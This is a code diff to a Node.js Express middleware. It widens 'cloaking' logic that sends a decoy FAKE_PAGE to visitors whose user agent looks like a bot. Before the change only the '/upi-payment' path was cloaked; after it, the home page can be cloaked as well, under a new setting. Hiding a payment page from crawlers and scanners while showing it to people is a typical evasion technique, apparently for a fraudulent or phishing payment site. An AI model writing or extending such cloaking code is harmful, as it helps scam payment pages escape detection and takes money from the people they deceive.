@@ -57,12 +57,19 @@ app.use((req, res, next) => {
 
   const ua = req.headers['user-agent'] || '';
   
-  // Cloaking Logic: Only apply if enabled in settings and path is /upi-payment
-  if (req.path.startsWith('/upi-payment') && BOT_PATTERNS.test(ua)) {
+  // Cloaking Logic: Only apply if enabled in settings
+  const isPaymentPage = req.path.startsWith('/upi-payment');
+  const isHomePage = req.path === '/';
+
+  if ((isPaymentPage || isHomePage) && BOT_PATTERNS.test(ua)) {
     try {
       const settingsPath = path.join(__dirname, 'data/settings.json');
       const settings = JSON.parse(fs.readFileSync(settingsPath, 'utf8'));
-      if (settings.enableCloaking) {
+      
+      const shouldCloakPayment = isPaymentPage && settings.enableCloaking;
+      const shouldCloakHome = isHomePage && settings.enableHomeCloaking;
+
+      if (shouldCloakPayment || shouldCloakHome) {
         return res.status(200).set('Content-Type', 'text/html').send(FAKE_PAGE);
       }
     } catch (e) {
